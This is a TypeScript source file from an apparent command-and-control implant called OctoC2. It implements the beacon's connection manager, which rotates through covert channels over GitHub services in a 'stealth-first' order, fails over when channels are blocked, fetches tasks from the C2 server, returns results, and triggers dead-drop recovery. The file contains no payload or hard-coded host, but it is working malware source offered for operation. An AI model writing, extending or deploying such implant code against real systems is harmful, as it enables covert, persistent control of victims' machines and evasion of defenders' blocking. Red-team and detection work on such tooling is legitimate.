/**
 * OctoC2 — ConnectionFactory
 *
 * The "brain" of the implant. Manages all registered tentacles,
 * enforces priority ordering, handles automatic failover, and tracks
 * per-tentacle health so the beacon stays connected even when individual
 * GitHub channels are rate-limited, blocked, or unavailable.
 *
 *   Default priority waterfall (auto-detected, stealth-first):
 *     codespaces (gRPC/SSH) → http (WS/REST on :8080) → proxy (OctoProxy relay) → issues (last resort)
 *
 *   Failover rules:
 *     1. Try tentacles in priority order.
 *     2. On error, mark tentacle as DEGRADED, increment fail counter.
 *     3. After maxFailures, tentacle enters COOLDOWN for degradedCooldownMs.
 *     4. If ALL tentacles fail, beacon enters deep sleep and retries.
 */

import type {
  ITentacle,
  TentacleKind,
  CheckinPayload,
  Task,
  TaskResult,
  ConnectionFactoryOptions,
} from "../types.ts";
import { OctoProxyTentacle } from '../tentacles/OctoProxyTentacle.ts';
import { createLogger } from "../logger.ts";

const log = createLogger("ConnectionFactory");

// ── Tentacle health state ──────────────────────────────────────────────────────

type TentacleState = "active" | "degraded" | "cooldown" | "disabled";

interface TentacleEntry {
  tentacle:       ITentacle;
  state:          TentacleState;
  /** Consecutive failure counter — resets to 0 on success. */
  failures:       number;
  cooldownUntil:  number;       // epoch ms
  /** Cumulative counts for success-rate tracking. */
  totalSuccesses: number;
  totalFailures:  number;
  lastSuccessAt:  string | null;
  lastFailureAt:  string | null;
}

// ── Health snapshot shape ──────────────────────────────────────────────────────

export interface TentacleHealth {
  state:          TentacleState;
  failures:       number;       // consecutive
  totalSuccesses: number;
  totalFailures:  number;
  /** 0–1 ratio; null when no calls have been made yet. */
  successRate:    number | null;
  lastSuccessAt:  string | null;
  lastFailureAt:  string | null;
}

// ── ConnectionFactory ──────────────────────────────────────────────────────────

export class ConnectionFactory {
  private readonly options: Required<ConnectionFactoryOptions>;
  private readonly registry = new Map<TentacleKind, TentacleEntry>();
  /** Proxy tentacles stored as an ordered list — one per proxyRepo entry. */
  private proxyEntries: TentacleEntry[] = [];
  /** False until the first successful checkin — gates [bootstrap] log lines. */
  private bootstrapped = false;

  constructor(options: ConnectionFactoryOptions) {
    this.options = {
      maxFailures: 3,
      degradedCooldownMs: 5 * 60 * 1000, // 5 minutes
      ...options,
    };
  }

  // ── Registration ─────────────────────────────────────────────────────────────

  /**
   * Register a tentacle implementation.
   * Call this for each tentacle before the beacon starts its main loop.
   */
  register(tentacle: ITentacle): this {
    this.registry.set(tentacle.kind, {
      tentacle,
      state:          "active",
      failures:       0,
      cooldownUntil:  0,
      totalSuccesses: 0,
      totalFailures:  0,
      lastSuccessAt:  null,
      lastFailureAt:  null,
    });
    return this;
  }

  /**
   * Store multiple proxy tentacles (one per proxyRepo entry) as an ordered list.
   * Replaces any previously set proxy tentacles. Use this instead of calling
   * register() for proxy tentacles — register() uses a Map keyed by kind, so
   * only the last proxy would survive.
   */
  setProxyTentacles(tentacles: ITentacle[]): void {
    this.proxyEntries = tentacles.map((tentacle) => ({
      tentacle,
      state:          "active" as const,
      failures:       0,
      cooldownUntil:  0,
      totalSuccesses: 0,
      totalFailures:  0,
      lastSuccessAt:  null,
      lastFailureAt:  null,
    }));
  }

  // ── Factory-built tentacles from config ──────────────────────────────────────

  /**
   * Build and return all tentacles derived from `config.tentaclePriority`.
   * Currently handles the 'proxy' case — other kinds are registered
   * directly in index.ts via register(). Proxy is special because it
   * creates one ITentacle instance per entry in config.proxyRepos.
   */
  getTentacles(): ITentacle[] {
    const tentacles: ITentacle[] = [];
    const config = this.options.config;

    for (const kind of config.tentaclePriority) {
      switch (kind) {
        case 'proxy': {
          const proxyRepos = config.proxyRepos ?? [];
          for (const proxyConfig of proxyRepos) {
            tentacles.push(new OctoProxyTentacle(config, proxyConfig));
          }
          break;
        }
        default:
          break;
      }
    }

    return tentacles;
  }

  // ── Priority list ─────────────────────────────────────────────────────────────

  /**
   * Returns tentacles in operator-configured priority order,
   * filtered to those currently not in cooldown/disabled.
   */
  private activeTentacles(): TentacleEntry[] {
    const now = Date.now();
    const priorityOrder = this.options.config.tentaclePriority;

    const result: TentacleEntry[] = [];

    for (const kind of priorityOrder) {
      if (kind === "proxy") {
        // Expand proxy entries in order — each is an independent tentacle
        for (const entry of this.proxyEntries) {
          if (entry.state === "disabled") continue;
          if (entry.state === "cooldown" && now < entry.cooldownUntil) continue;
          if (entry.state === "cooldown" && now >= entry.cooldownUntil) {
            entry.state    = "active";
            entry.failures = 0;
            log.info(`Proxy tentacle cooldown expired — re-activating.`);
          }
          result.push(entry);
        }
      } else {
        const entry = this.registry.get(kind);
        if (!entry) continue;
        if (entry.state === "disabled") continue;
        if (entry.state === "cooldown" && now < entry.cooldownUntil) continue;
        if (entry.state === "cooldown" && now >= entry.cooldownUntil) {
          entry.state    = "active";
          entry.failures = 0;
          log.info(`Tentacle '${entry.tentacle.kind}' cooldown expired — re-activating.`);
        }
        result.push(entry);
      }
    }

    return result;
  }

  // ── Health tracking ───────────────────────────────────────────────────────────

  private recordSuccess(entry: TentacleEntry): void {
    entry.failures       = 0;
    entry.state          = "active";
    entry.totalSuccesses++;
    entry.lastSuccessAt  = new Date().toISOString();
  }

  private recordFailure(entry: TentacleEntry): void {
    entry.failures++;
    entry.totalFailures++;
    entry.lastFailureAt = new Date().toISOString();

    if (entry.failures >= this.options.maxFailures) {
      entry.state        = "cooldown";
      entry.cooldownUntil = Date.now() + this.options.degradedCooldownMs;
      log.warn(
        `Tentacle '${entry.tentacle.kind}' entered cooldown ` +
        `after ${entry.failures} consecutive failures.`
      );
    } else {
      entry.state = "degraded";
    }
  }

  // ── Core operations (with failover) ──────────────────────────────────────────

  /**
   * Checkin with the C2 server via the highest-priority available tentacle.
   * Returns the list of pending tasks.
   *
   * Tries each tentacle in order; on failure, records the error and
   * tries the next. If all fail, returns an empty task list (beacon sleeps).
   */
  async checkin(payload: CheckinPayload): Promise<Task[]> {
    const tentacles   = this.activeTentacles();
    const isBootstrap = !this.bootstrapped;

    if (tentacles.length === 0) {
      log.error("All tentacles exhausted — entering deep sleep.");
      return [];
    }

    for (const entry of tentacles) {
      if (isBootstrap) {
        log.info(`[bootstrap] trying '${entry.tentacle.kind}' for initial registration`);
      }
      try {
        const available = await entry.tentacle.isAvailable();
        if (!available) {
          this.recordFailure(entry);
          if (isBootstrap) {
            log.warn(`[bootstrap] '${entry.tentacle.kind}' unavailable — trying next`);
          }
          continue;
        }

        const tasks = await entry.tentacle.checkin(payload);
        this.recordSuccess(entry);
        if (isBootstrap) {
          this.bootstrapped = true;
          log.info(`[bootstrap] initial registration succeeded via '${entry.tentacle.kind}'`);
        }
        return tasks;
      } catch (err) {
        this.recordFailure(entry);
        log.warn(
          `Tentacle '${entry.tentacle.kind}' checkin failed: ${(err as Error).message}`
        );
        if (isBootstrap) {
          log.warn(`[bootstrap] '${entry.tentacle.kind}' failed — falling through to next`);
        }
      }
    }

    return [];
  }

  /**
   * Submit a task result via the highest-priority available tentacle.
   * Uses the same failover logic as checkin().
   */
  async submitResult(result: TaskResult): Promise<boolean> {
    const tentacles = this.activeTentacles();

    for (const entry of tentacles) {
      try {
        const available = await entry.tentacle.isAvailable();
        if (!available) {
          this.recordFailure(entry);
          continue;
        }

        await entry.tentacle.submitResult(result);
        this.recordSuccess(entry);
        return true;
      } catch (err) {
        this.recordFailure(entry);
        log.warn(
          `Tentacle '${entry.tentacle.kind}' submitResult failed: ${(err as Error).message}`
        );
      }
    }

    log.error(`Failed to submit result for task ${result.taskId} — all tentacles failed.`);
    return false;
  }

  // ── Diagnostic ────────────────────────────────────────────────────────────────

  /**
   * Returns a snapshot of tentacle health for debug/logging.
   * Includes cumulative success/failure counts, success rate, and timestamps.
   */
  healthSnapshot(): Record<string, TentacleHealth> {
    const snap: Record<string, TentacleHealth> = {};
    for (const [kind, entry] of this.registry) {
      const total = entry.totalSuccesses + entry.totalFailures;
      snap[kind] = {
        state:          entry.state,
        failures:       entry.failures,
        totalSuccesses: entry.totalSuccesses,
        totalFailures:  entry.totalFailures,
        successRate:    total > 0 ? entry.totalSuccesses / total : null,
        lastSuccessAt:  entry.lastSuccessAt,
        lastFailureAt:  entry.lastFailureAt,
      };
    }
    for (let i = 0; i < this.proxyEntries.length; i++) {
      const entry = this.proxyEntries[i]!;
      const total = entry.totalSuccesses + entry.totalFailures;
      snap[`proxy:${i}`] = {
        state:          entry.state,
        failures:       entry.failures,
        totalSuccesses: entry.totalSuccesses,
        totalFailures:  entry.totalFailures,
        successRate:    total > 0 ? entry.totalSuccesses / total : null,
        lastSuccessAt:  entry.lastSuccessAt,
        lastFailureAt:  entry.lastFailureAt,
      };
    }
    return snap;
  }

  /**
   * Returns true if every registered tentacle is either in unexpired cooldown
   * or disabled. The main loop uses this to decide when to attempt dead-drop
   * recovery (i.e., all channels have failed repeatedly — we're cut off).
   */
  isFullyExhausted(): boolean {
    if (this.registry.size === 0 && this.proxyEntries.length === 0) return true;
    const now = Date.now();
    for (const entry of [...this.registry.values(), ...this.proxyEntries]) {
      if (entry.state === "active" || entry.state === "degraded") return false;
      if (entry.state === "cooldown" && now >= entry.cooldownUntil) return false;
    }
    return true;
  }

  // ── Teardown ──────────────────────────────────────────────────────────────────

  async teardown(): Promise<void> {
    await Promise.allSettled(
      [...this.registry.values(), ...this.proxyEntries].map((e) => e.tentacle.teardown())
    );
    this.registry.clear();
    this.proxyEntries = [];
    this.bootstrapped = false;
  }
}
